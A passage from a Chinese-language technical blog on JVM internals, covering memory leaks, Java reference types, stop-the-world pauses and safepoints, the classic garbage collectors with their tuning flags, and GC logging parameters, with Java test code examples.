&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="7）缓存泄漏"><a href="#7）缓存泄漏" class="headerlink" title="7）缓存泄漏"></a>7）缓存泄漏</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Tst7</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Map&lt;String, String&gt; cache = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 假设在系统启动时，这些缓存数据从数据库中加载，使用HashMap导致缓存内存泄漏。</span></span><br><span class="line">        <span class="comment">// 可改为WeakHashMap，除自身外，若key没有被引用，那么这个map会丢弃这个键值对。</span></span><br><span class="line">        cache.put(<span class="string">&quot;u1&quot;</span>, <span class="string">&quot;user1&quot;</span>);</span><br><span class="line">        cache.put(<span class="string">&quot;u2&quot;</span>, <span class="string">&quot;user2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="8）监听器和回调"><a href="#8）监听器和回调" class="headerlink" title="8）监听器和回调"></a>8）监听器和回调</h4><p>如果客户端在你实现的API中注册回调，没有显式的取消导致内存泄漏。可改为WeakHashMap。</p>
<h2 id="6-5-引用分类"><a href="#6-5-引用分类" class="headerlink" title="6.5 引用分类"></a>6.5 引用分类</h2><p>在JDK 1.2版之后，Java对引用的概念进行了扩充，将引用分为强引用（Strongly Re-ference）、软引用（Soft Reference）、弱引用（Weak Reference）和虚引用（Phantom Reference）4种，这4种引用强度依次逐渐减弱。</p>
<ul>
<li>强引用（不回收）：传统定义的“引用”，是指程序中的引用赋值，即类似“Object obj&#x3D;new Object()”这种引用关系。无论任何情况下，只要强引用关系还存在，被引用的对象就不会被回收。</li>
<li>软引用（内存不足即回收）：用来描述一些还有用，但非必须的对象。只被软引用关联着的对象，在系统将要发生内存溢出异常前，会把这些对象列进回收范围之中进行第二次回收，如果这次回收还没有足够的内存，才会抛出内存溢出异常。在JDK 1.2版之后提供了SoftReference类来实现软引用。</li>
<li>弱引用（发现即回收）：也是用来描述那些非必须对象，但是它的强度比软引用更弱一些，被弱引用关联的对象只能生存到下一次垃圾收集发生为止。当垃圾收集器开始工作，无论当前内存是否足够，都会回收掉只被弱引用关联的对象。在JDK 1.2版之后提供了WeakReference类来实现弱引用。</li>
<li>虚引用（对象回收跟踪）：也称为“幽灵引用”或者“幻影引用”，它是最弱的一种引用关系。一个对象是否有虚引用的存在，完全不会对其生存时间构成影响，也无法通过虚引用来取得一个对象实例。为一个对象设置虚引用关联的唯一目的只是为了能在这个对象被收集器回收时收到一个系统通知。在JDK 1.2版之后提供了PhantomReference类来实现虚引用。</li>
</ul>
<p>另外，还有一种终结器引用：用来实现对象的finalize() 方法，无需手动编码，内部配合引用队列使用，在GC时，终结器引用入队。由Finalizer线程通过终结器引用找到被引用对象，然后调用它的finalize()方法，然后收集器对队列中的对象进行第二次小规模的标记，如果对象没有在finalize()中拯救自己，则该对象会被回收。</p>
<p>弱引用测试代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zhifei;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.WeakHashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WeakRefTest</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Map&lt;String, String&gt; weakMap = <span class="keyword">new</span> <span class="title class_">WeakHashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Map&lt;String, String&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="comment">// key一定要用new String()的方式，不能用字面量，否则会添加到字符串常量池，该字符串还存在引用。</span></span><br><span class="line">        weakMap.put(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;w1&quot;</span>), <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        weakMap.put(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;w2&quot;</span>), <span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        map.put(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;m1&quot;</span>), <span class="string">&quot;111&quot;</span>);</span><br><span class="line">        map.put(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;m2&quot;</span>), <span class="string">&quot;222&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        testWeakMap();</span><br><span class="line">        System.out.println(<span class="string">&quot;=========================&quot;</span>);</span><br><span class="line">        testMap();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">testWeakMap</span><span class="params">()</span> &#123;</span><br><span class="line">        weakMap.entrySet().forEach(e -&gt; &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;key: &quot;</span> + e.getKey() + <span class="string">&quot;, value: &quot;</span> + e.getValue());</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        System.gc();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            TimeUnit.MILLISECONDS.sleep(<span class="number">2000</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        weakMap.entrySet().forEach(e -&gt; &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;key: &quot;</span> + e.getKey() + <span class="string">&quot;, value: &quot;</span> + e.getValue());</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">testMap</span><span class="params">()</span> &#123;</span><br><span class="line">        map.entrySet().forEach(e -&gt; &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;key: &quot;</span> + e.getKey() + <span class="string">&quot;, value: &quot;</span> + e.getValue());</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        System.gc();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            TimeUnit.MILLISECONDS.sleep(<span class="number">2000</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        map.entrySet().forEach(e -&gt; &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;key: &quot;</span> + e.getKey() + <span class="string">&quot;, value: &quot;</span> + e.getValue());</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="6-6-STW（Stop-The-World）"><a href="#6-6-STW（Stop-The-World）" class="headerlink" title="6.6 STW（Stop-The-World）"></a>6.6 STW（Stop-The-World）</h2><p>指的是在GC过程中，会产生应用程序的停顿。停顿产生时整个应用程序的线程都会被暂停，没有任何响应。</p>
<p>可达性分析中枚举根节点，会导致所有Java执行线程停顿：</p>
<ul>
<li>分析工作必须在一个能确保一致性的快照中进行。一致性指的是整个分析期间，整个系统看起来像被冻结在某个时间点上。</li>
<li>如果出现分析过程中对象引用关系还在不断变化，则分析结果的准确性也无法保证。</li>
</ul>
<h3 id="6-6-1-安全点（Safepoint）"><a href="#6-6-1-安全点（Safepoint）" class="headerlink" title="6.6.1 安全点（Safepoint）"></a>6.6.1 安全点（Safepoint）</h3><p>程序执行时并非在所有地方都能停顿下来开始GC，只有在特定的位置才能停顿下来开始GC，这些位置称为“安全点”。安全点的选定既不能太少以至于让收集器等待时间过长，也不能太过频繁以至于过分增大运行时的内存负荷。安全点位置的选取基本上是以“是否具有让程序长时间执行的特征”为标准进行选定的，比如：方法调用、循环跳转、异常跳转等执行时间较长的指令。</p>
<p>垃圾收集时，让所有线程都跑到最近的安全点并停顿下来的方法：</p>
<ul>
<li>抢先式中断 （Preemptive Suspension，目前没有虚拟机使用了）：先中断所有用户线程，如果还有用户线程不在安全点，就恢复线程，直到跑到安全点。</li>
<li>主动式中断（Voluntary Suspension）：设置一个中断标志位，各个线程执行到安全点时主动轮询这个标志，如果中断标志位真，则将自己进行中断挂起。</li>
</ul>
<h3 id="6-6-2-安全区域（Safe-Region）"><a href="#6-6-2-安全区域（Safe-Region）" class="headerlink" title="6.6.2 安全区域（Safe Region）"></a>6.6.2 安全区域（Safe Region）</h3><p>安全点的设计解决了执行中的用户线程的停顿问题，但用户线程处于“不执行”的状态还没解决，比如：用户线程处于Sleep状态或Block状态，无法走到安全点进行中断挂起。</p>
<p>安全区域：在一段代码片段中，引用关系不会发生变化，在这个区域中任意地方开始垃圾收集都是安全的。我们也可以把安全区域看作被扩展拉伸了的安全点。</p>
<p>安全区域的执行与离开：</p>
<ul>
<li>当线程执行到安全区域里面的代码时，先标识自己已经进入安全区域，如果这段时间发起垃圾收集，虚拟机会忽略在安全区域内的线程。</li>
<li>当线程要离开安全区域时，先检查虚拟机是否已经完成了根节点枚举（或者垃圾收集过程中其他需要暂停用户线程的阶段），如果完成了，那线程就继续执行；否则它就必须一直等待，直到收到可以离开安全区域的信号为止。</li>
</ul>
<h2 id="6-7-并行与并发"><a href="#6-7-并行与并发" class="headerlink" title="6.7 并行与并发"></a>6.7 并行与并发</h2><p>并行（Parallel）：</p>
<ul>
<li>CPU角度：同一时间，不同线程运行在不同CPU上。</li>
<li>垃圾收集器角度：多条垃圾收集线程并行工作，此时的用户线程仍处于等待状态。（并行的收集器：ParNew、Parallel Scavenge、Parallel Old，高吞吐量。）</li>
</ul>
<p>串行（Serial）：</p>
<ul>
<li><p>CPU角度：同一CPU，先后执行多个线程。</p>
</li>
<li><p>垃圾收集器角度：单线程执行，如果内存不够，先暂停程序，JVM的垃圾收集器进行垃圾回收后，在启动程序的线程。</p>
</li>
</ul>
<p>并发（Concurrent）：</p>
<ul>
<li><p>CPU角度：同一时间，同一CPU，同时执行多个线程。（交替执行）</p>
</li>
<li><p>垃圾收集器角度：用户线程与垃圾收集线程同时执行，不一定是并行，可能是交替执行。（并发的收集器：CMS、G1，低延迟。）</p>
</li>
</ul>
<h2 id="6-8-七个经典垃圾收集器"><a href="#6-8-七个经典垃圾收集器" class="headerlink" title="6.8 七个经典垃圾收集器"></a>6.8 七个经典垃圾收集器</h2><p>可根据四个维度进行分类：串行与并行、并发式与独占式、压缩式与非压缩式（是否消除内存碎片）、新生代与老年代。</p>
<ul>
<li>串行收集器：Serial、Serial Old（MSC）</li>
<li>并行收集器：ParNew、Parallel Scavenge、Parallel Old</li>
<li>并发收集器：CMS、G1</li>
</ul>
<p><img src="/../img/gc_relation.png"></p>
<p>查看默认GC：</p>
<ul>
<li>-XX:+PrintCommandLineFlags，查看命令行相关参数（包含垃圾收集器）。</li>
<li>命令行指令：jinfo -flag 收集器参数 进程ID，收集器可选值：UseSerialGC、UseParNewGC、UseParallelGC、UseConcMarkSweepGC、UseG1GC。</li>
</ul>
<p>GC评估指标：</p>
<ul>
<li>吞吐量：运行用户代码的时间 &#x2F; （运行用户代码的时间 + 运行垃圾收集的时间）。</li>
<li>垃圾收集开销：吞吐量的补救，垃圾收集器所占时间与总时间的比例。</li>
<li>暂停时间：执行垃圾收集时，程序的工作线程被暂停的时间。</li>
<li>收集频率：相对于应用程序的执行，收集操作发生的频率。</li>
<li>内存占用：Java堆区所占的内存大小。</li>
<li>快速：一个对象从诞生到被回收所经历的时间。</li>
</ul>
<p>其中，着重关注吞吐量、暂停时间（延迟）、内存占用这3项，通常最多只能同时满足其中2项。随着硬件的发展，极大地提高了内存占用的容忍度，提高了吞吐量。而内存的扩大，反而对延迟带来负面效果。</p>
<p>追求高吞吐：需要降低内存回收的频率，导致垃圾收集器需要更长的暂停时间来回收内存。</p>
<p>追求低延迟：为了降低每次内存回收时的暂停时间，只能频繁执行内存回收，这又导致了新生代内存的缩减和程序吞吐量的下降。</p>
<p>现在JVM调优标准：在最大吞吐量优先的情况下，降低停顿时间。</p>
<h3 id="6-8-1-Serial、Serial-Old"><a href="#6-8-1-Serial、Serial-Old" class="headerlink" title="6.8.1 Serial、Serial Old"></a>6.8.1 Serial、Serial Old</h3><p>​		Serial收集器是最基础、历史最悠久的收集器，曾经（在JDK 1.3.1之前）是HotSpot虚拟机新生代收集器的唯一选择。它是单线程工作的收集器，必须暂停其他所有工作线程（STW机制），直到它收集结束。它依然是HotSpot虚拟机运行在客户端模式下的默认新生代收集器。</p>
<p>垃圾回收算法：复制算法（Serial，用于新生代）、标记-整理算法（Serial Old，用于老年代）。</p>
<p>优点：简单且在单线程环境下高效（与其他收集器的单线程相比）。</p>
<p>缺点：在多线程环境下，效率低。</p>
<p>应用场景：内存小的用户桌面应用（几十兆甚至一两百兆）。</p>
<p>相关JVM参数：</p>
<ul>
<li>-XX:+&#x2F;-UseSerialGC，使用&#x2F;禁用Serial收集器，默认激活老年代的Serial Old收集器。</li>
</ul>
<h3 id="6-8-2-ParNew"><a href="#6-8-2-ParNew" class="headerlink" title="6.8.2 ParNew"></a>6.8.2 ParNew</h3><p>​		ParNew收集器实质上是Serial收集器的多线程并行版本，除了同时使用多条线程进行垃圾收集之外，其余的行为（包括STW机制）都与Serial收集器完全一致，在实现上这两种收集器也共用了相当多的代码。</p>
<p>垃圾回收算法：复制算法（用于新生代）。</p>
<p>优点：在多线程环境下，效率高，提升程序吞吐量。除了Serial收集器外，目前只有它能与CMS收集器配合工作。</p>
<p>缺点：在单线程环境下，效率比Serial收集器低。</p>
<p>相关JVM参数：</p>
<ul>
<li><p>-XX:+&#x2F;-UseParNewGC，使用&#x2F;禁用ParNew收集器（不影响老年代）。</p>
</li>
<li><p>-XX:ParallelGCThreads，设置并行收集器的线程数量，当CPU核心数不超过8时，默认等于CPU核心数。</p>
</li>
</ul>
<h3 id="6-8-3-Parallel-Scavenge、Parallel-Old"><a href="#6-8-3-Parallel-Scavenge、Parallel-Old" class="headerlink" title="6.8.3 Parallel Scavenge、Parallel Old"></a>6.8.3 Parallel Scavenge、Parallel Old</h3><p>Parallel Scavenge收集器与ParNew收集器类似（包括STW机制），都是基于并行回收且只在新生代的收集器。与ParNew主要区别：</p>
<ul>
<li>Parallel Scavenge收集器的目标是达到一个可控制的吞吐量，也经常被称作“吞吐量优先收集器”。</li>
<li>Parallel Scavenge收集器具有自适应的调节策略。</li>
</ul>
<p>垃圾回收算法：复制算法（Parallel Scavenge，用于新生代，JDK 1.4提供）、标记-整理算法（Parallel Old，用于老年代，JDK 6才提供）。</p>
<p>优点：吞吐量优先的场景下，与Parallel Old收集器组合使用性能好。（JDK 8默认的组合）</p>
<p>缺点：吞吐量优先，一定程度上增加了停顿时间。</p>
<p>相关JVM参数：</p>
<ul>
<li><p>-XX:+&#x2F;-UseParallelGC，使用&#x2F;禁用Parallel Scavenge收集器，默认激活老年代的Serial Old收集器。</p>
</li>
<li><p>-XX:+&#x2F;-UseParallelOldGC，使用&#x2F;禁用Parallel Old收集器，默认激活新生代的Parallel Scavenge收集器。</p>
</li>
<li><p>-XX:ParallelGCThreads，设置并行收集器的线程数量，当CPU核心数不超过8时，默认等于CPU核心数。</p>
</li>
<li><p>-XX:MaxGCPauseMillis，设置垃圾收集最大停顿时间（毫秒，尽力保证不超过设定值）。垃圾收集停顿时间缩短是以牺牲吞吐量和新生代空间为代价换取的：系统把新生代调得小一些，收集300MB新生代肯定比收集500MB快，但这也直接导致垃圾收集发生得更频繁，原来10秒收集一次、每次停顿100毫秒，现在变成5秒收集一次、每次停顿70毫秒。停顿时间的确在下降，但吞吐量也降下来了。（谨慎使用）</p>
</li>
<li><p>-XX:GCTimeRatio，直接设置吞吐量大小。参数的值则应当是一个大于0小于100的整数，也就是垃圾收集时间占总时间的比率，相当于吞吐量的倒数。比如：把此参数设置为19，那允许的最大垃圾收集时间就占总时间的5%（即1&#x2F;(1+19)），默认值为99，即允许最大1%（即1&#x2F;(1+99)）的垃圾收集时间。</p>
</li>
<li><p>-XX:+UseAdaptiveSizePolicy，设置Parallel Scavenge收集器具有自适应的调节策略（GC Ergonomics）。当参数被激活后，新生代的大小、Eden与Survivor的比例、晋升老年代对象的年龄等参数会动态调整，以提供最合适的停顿时间或者最大的吞吐量。</p>
<p>如果手工优化存在困难，可以直接使用这种自适应的调节策略。只需设置最大堆、停顿时间（更关注最大停顿时间）或吞吐量大小（更关注吞吐量），具体调节工作交给虚拟机完成。</p>
<p>注意：Parallel这组收集器默认开启这个调节策略，导致Eden:S0:S1 &#x3D; 6:1:1（尽管手动关闭调节策略），可通过-XX:SurvivorRatio&#x3D;8修改为8:1:1。自动调节策略在有些情况下，可能把Survivor调节得很小，导致对象大多进入老年区，从而触发FullGC，在高响应的系统中是不可取的。面对大流量、低延迟系统，不建议启用此参数，可手动设置比例或采用CMS收集器，CMS收集器无论怎么设置，其调节策略固定为false。</p>
</li>
</ul>
<h3 id="6-8-4-CMS"><a href="#6-8-4-CMS" class="headerlink" title="6.8.4 CMS"></a>6.8.4 CMS</h3><p>​		CMS（Concurrent Mark Sweep）收集器是一种以获取最短回收停顿时间为目标的收集器。希望系统停顿时间尽可能短，以给用户带来良好的交互体验。在G1收集器出现之前，CMS使用还是非常广泛的，直到今天，仍然有很多系统使用。它的收集过程分为四个步骤：</p>
<ol>
<li>初始标记（CMS initial mark）：仅标记GC Roots能直接关联到的对象，速度很快，需要停顿用户线程（STW）。</li>
<li>并发标记（CMS concurrent mark）：从GC Roots的直接关联对象开始遍历整个对象图，耗时较长但不需要停顿用户线程。</li>
<li>重新标记（CMS remark）：修正并发标记期间，因用户程序继续运作而导致标记产生变动的那一部分对象的标记记录，这个阶段的停顿时间（STW）通常会比初始标记阶段长，但远比并发标记阶段的时间短。（指的是不可达变为可达的对象，可达对象变为不可达的情况会留到下次清理，也叫做浮动垃圾。）</li>
<li>并发清除（CMS concurrent sweep）：清理掉标记阶段判断的已经死亡的对象，因为不需要移动存活对象，所以不需要停顿用户线程。</li>
</ol>
<p>由于在整个过程中耗时最长的并发标记和并发清除阶段中，垃圾收集器线程都可以与用户线程一起工作，所以从总体上来说，CMS收集器的内存回收过程是与用户线程一起并发执行的。</p>
<p>垃圾回收算法：标记-清除算法（用于老年代，JDK 5提供）。</p>
<p>优点：并发收集、低延迟。</p>
<p>缺点：</p>
<ul>
<li>产生内存碎片。</li>
<li>对CPU资源非常敏感，虽然在并发阶段不会停顿用户线程，但也占用部分线程而导致程序变慢，吞吐量降低。</li>
<li>会产生浮动垃圾，预留的内存可能无法满足新对象的内存分配，就会出现一次“并发失败”（Concurrent Mode Failure），然后使用Serial Old收集器作为后备预案，效率大大降低。</li>
</ul>
<p>相关JVM参数：</p>
<ul>
<li>-XX:+&#x2F;-UseConcMarkSweepGC，使用&#x2F;禁用CMS收集器，默认激活新生代的ParNew收集器。</li>
<li>-XX:ParallelGCThreads，设置并行收集器的线程数量，当CPU核心数不超过8时，默认等于CPU核心数。</li>
<li>-XX:ConcGCThreads，设置并发收集器的线程数量。</li>
<li>-XX:CMSInitiatingOccupancyFraction，设置触发CMS的老年代空间使用率的阈值（JDK 5默认68%，JDK 6默认92%）。由于垃圾收集阶段用户线程还需要持续运行，所以需要预留足够内存空间提供给用户线程使用，因此CMS收集器不能像其他收集器那样等待到老年代几乎完全被填满了再进行收集，必须预留一部分空间供并发收集时的程序运作使用。如果老年代增长不快，可以适当调高这个阈值，降低内存回收频率，获取更好的性能。</li>
<li>-XX:+&#x2F;-UseCMSCompactAtFullCollection，开启&#x2F;关闭Full GC时内存碎片的整理（默认开启，JDK 9废弃），需要移动存活对象，导致停顿时间变长。</li>
<li>-XX:CMSFullGCsBeforeCompaction，设置不整理内存碎片的Full GC次数，经过设定的次数后，下一次Full GC前会整理碎片（默认0，表示每次Full GC都整理碎片，JDK 9废弃）。</li>
</ul>
<h3 id="6-8-5-G1"><a href="#6-8-5-G1" class="headerlink" title="6.8.5 G1"></a>6.8.5 G1</h3><p>​		Garbage First（G1，垃圾优先）收集器是垃圾收集器技术发展历史上的里程碑式的成果，它开创了收集器面向局部收集的设计思路和基于Region的内存布局形式。直至JDK 7 Update 4才移除了“Experimental”的标识，到了JDK 8 Update 40的时候，G1提供并发的类卸载的支持，补全了其计划功能的最后一块拼图，这个版本以后的G1收集器才被Oracle官方称为“全功能的垃圾收集器”（Fully-Featured Garbage Collector）。它主要面向服务端应用，期望未来可以替换掉CMS收集器。JDK 9发布时，G1宣告取代Parallel Scavenge加Parallel Old组合，成为服务端模式下的默认垃圾收集器，而CMS被声明为不推荐使用（Deprecate）的收集器。</p>
<p>​		G1开创了基于Region的堆内存布局，虽然仍遵循分代收集理论，但其堆内存布局与其他收集器有明显差异：G1不再坚持固定大小、固定数量的分代区域划分，而是把连续的堆划分为多个大小相等的独立区域（Region），每一个Region都可以根据需要，扮演Eden空间、Survivor空间，或老年代空间。收集器对扮演不同角色的Region采用不同的策略去处理，这样无论是新创建的对象还是旧对象都能获取很好的收集效果。</p>
<p>​		Region中特殊的Humongous区域，用来存储大对象，大小超过了一个Region容量的一半判定为大对象。超过整个Region容量的超级大对象，会被存放在N个连续的Humongous Region之中，G1会把Humongous Region作为老年代的一部分来看待。如下图：</p>
<p><img src="/../img/G1_heap.png"></p>
<p>​		Region是单次回收的最小单元，即每次收集到的内存空间都是Region大小的整数倍，可以避免在堆中进行全区域的垃圾收集。让G1收集器去跟踪各个Region的“价值”大小（即回收获得的空间以及所需的时间），然后在后台维护一个优先级列表，每次根据用户设定的收集停顿时间（-XX:MaxGCPauseMillis，默认200毫秒），优先处理回收价值大的那些Region，这也就是“Garbage First”名字的由来。这种具有优先级的区域回收方式，保证了G1收集器在有限的时间内获取尽可能高的收集效率。</p>
<p>它的收集过程大致分为四个步骤（仅并发标记阶段不暂停用户线程）：</p>
<ol>
<li>初始标记（Initial Marking）：仅标记GC Roots能直接关联到的对象，并且修改TAMS指针的值，让下一阶段用户线程并发运行时，能正确地在可用的Region中分配新对象。这个阶段需要停顿线程，但耗时很短，而且是借用进行Minor GC的时候同步完成的，所以G1收集器在这个阶段实际并没有额外的停顿。</li>
<li>并发标记（Concurrent Marking）：从GC Root开始对堆中对象进行可达性分析，递归扫描整个堆里的对象图，找出要回收的对象，这阶段耗时较长，但可与用户程序并发执行。当对象图扫描完成以后，还要重新处理原始快照记录下的在并发时有引用变动的对象。</li>
<li>最终标记（Final Marking）：对用户线程做另一个短暂的暂停，用于处理并发阶段结束后仍遗留下来的最后那少量的原始快照记录。</li>
<li>筛选回收（Live Data Counting and Evacuation）：负责更新Region的统计数据，对各个Region的回收价值和成本进行排序，根据用户所期望的停顿时间来制定回收计划，可以自由选择任意多个Region构成回收集，然后把决定回收的那一部分Region的存活对象复制到空的Region中，再清理掉整个旧Region的全部空间。这里的操作涉及存活对象的移动，是必须暂停用户线程，由多条收集器线程并行完成的。</li>
</ol>
<p>垃圾回收算法：复制算法（用于Region之间，JDK 7提供），但整体上看是标记-整理算法。</p>
<p>优点：相比CMS，G1不会产生内存碎片。在有限的时间内获取尽可能高的收集效率。</p>
<p>缺点：相比CMS，G1内存占用、执行负载更高。通常，堆内存6GB ~ 8GB，CMS与G1性能相当，堆内存更小用CMS，更大则用G1。</p>
<p>相关JVM参数（通常只需要开启G1垃圾收集器、设置堆最大内存、设置最大停顿时间即可）：</p>
<ul>
<li>-XX:+&#x2F;-UseG1GC，使用&#x2F;禁用G1收集器。</li>
<li>-XX:ParallelGCThreads，设置并行收集器的线程数量，当CPU核心数不超过8时，默认等于CPU核心数。</li>
<li>-XX:ConcGCThreads，设置并发收集器的线程数量。</li>
<li>-XX:G1HeapRegionSize，设置每个Region的大小，范围为1MB～32MB，且应为2的N次幂。目标是根据最小的堆大小划分约2048个区域，默认是堆内存的1&#x2F;2000。</li>
<li>-XX:MaxGCPauseMillis，设置垃圾收集最大停顿时间（毫秒，尽力保证不超过设定值）。默认200毫秒。</li>
<li>-XX:InitiatingHeapOccupancyPercent，设置触发并发GC周期的堆占用率阈值。超过即触发GC，默认45。</li>
</ul>
<h2 id="6-9-GC日志参数"><a href="#6-9-GC日志参数" class="headerlink" title="6.9 GC日志参数"></a>6.9 GC日志参数</h2><ul>
<li>-XX:+PrintGC，开启简陋的GC日志，默认输出到标准流，与-verbose:gc类似。</li>
<li>-XX:+PrintGCDetails，开启详细的GC日志，并在进程退出时，输出内存各个区域的分配情况。</li>
<li>-XX:+PrintGCDateStamps，行首记录出现GC的时间。（具体时刻，比如：2019-08-12T18:35:02.783+0800）</li>
<li>-XX:+PrintGCTimeStamps，行首记录出现GC的时间。（启动到出现GC所经过的时间，比如：5.159）</li>
<li>-XX:+PrintHeapAtGC，每次GC前后都打印堆的信息。</li>
<li>-XX:+PrintReferenceGC，记录不同类型的引用回收情况。</li>
<li>-XX:+PrintTenuringDistribution，在每次新生代GC后，打印当前使用的幸存区中对象的年龄分布。</li>
<li>-XX:+PrintGCApplicationStoppedTime，打印GC时线程的停顿时间。</li>
<li>-XX:+PrintGCApplicationConcurrentTime，打印GC前应用未中断的执行时间。</li>
<li>-XX:+PrintSafepointStatistics，打印安全点统计信息。</li>
<li>-XX:PrintSafepointStatisticsCount&#x3D;1，设置安全点统计信息打印的次数。</li>
<li>-Xloggc:&#x2F;logs&#x2F;gc-%t.log，指定保存GC日志的文件，可搭配%t参数使用（JVM启动的时间yyyy-MM-dd_HH-mm-ss）。<a href="https://gceasy.io/gc-index.jsp">gceasy.io（GC日志在线分析）</a> </li>
<li>-XX:+UseGCLogFileRotation，开启GC日志文件的自动转储。</li>
<li>-XX:NumberOfGCLogFiles&#x3D;5，指定GC日志文件的循环数目（filename.0 ~ filename.N-1），最后一个文件达到指定大小后，从0号文件重新写入。</li>
<li>-XX:GCLogFileSize&#x3D;20M，指定单个GC日志文件的大小。</li>
</ul>
<p>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 必备</span><br><span class="line">-XX:+PrintGCDetails</span><br><span class="line">-XX:+PrintGCDateStamps</span><br><span class="line">-XX:+PrintHeapAtGC</span><br><span class="line">-XX:+PrintReferenceGC</span><br><span class="line">-XX:+PrintTenuringDistribution</span><br><span class="line">-XX:+PrintGCApplicationStoppedTime</span><br><span class="line"></span><br><span class="line"># 可选</span><br><span class="line">-XX:+PrintSafepointStatistics</span><br><span class="line">-XX:PrintSafepointStatisticsCount=1</span><br><span class="line"></span><br><span class="line"># GC日志文件</span><br><span class="line">-Xloggc:/logs/gc-%t.log</span><br><span class="line">-XX:+UseGCLogFileRotation</span><br><span class="line">-XX:NumberOfGCLogFiles=5</span><br><span class="line">-XX:GCLogFileSize=20M</span><br></pre></td></tr></table></figure>

<h1 id="7-性能监控"><a href="#7-性能监控" class="headerlink" title="7. 性能监控"></a>7. 性能监控</h1><h2 id="7-1-OOM分析"><a href="#7-1-OOM分析" class="headerlink" title="7.1 OOM分析"></a>7.1 OOM分析</h2><p>相关参数：</p>
<ul>
<li>-XX:+HeapDumpOnOutOfMemoryError，出现OOM时，记录堆转储文件。</li>
<li>-XX:HeapDumpPath&#x3D;&#x2F;logs&#x2F;heapdump.hprof，指定OOM时堆转储文件的位置。通常与-XX:+HeapDumpOnOutOfMemoryError参数一同使用。（若已存在堆转储文件，则不会生成新的堆转储文件）</li>
<li>-XX:OnOutOfMemoryError&#x3D;”脚本”，指定程序或者脚本，出现OOM时，执行这个脚本（例如重启脚本）。</li>
</ul>
<p>分析大致步骤：</p>
<ol>
<li>通过MAT工具分析堆转储文件，判断是内存泄漏还是内存溢出；</li>
<li>若是内存泄漏，通过工具进一步查看泄漏对象到GC Roots的引用链，定位到泄漏的代码；</li>
<li>若是内存溢出，则增大内存。</li>
</ol>
<h3 id="1）堆溢出"><a href="#1）堆溢出" class="headerlink" title="1）堆溢出"></a>1）堆溢出</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zhifei;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.UUID;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HeapOOMTest</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 测试OOM并记录堆转储文件，通过jvisualvm观察大对象会直接进入养老区，而不在Eden区，并分析堆转储文件。</span></span><br><span class="line"><span class="comment">     * 配置JVM参数：-Xms6m -Xmx6m -XX:+PrintGCDetails -XX:SurvivorRatio=8 -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=heapdump.hprof</span></span><br><span class="line"><span class="comment">     * 异常信息：java.lang.OutOfMemoryError: Java heap space</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span 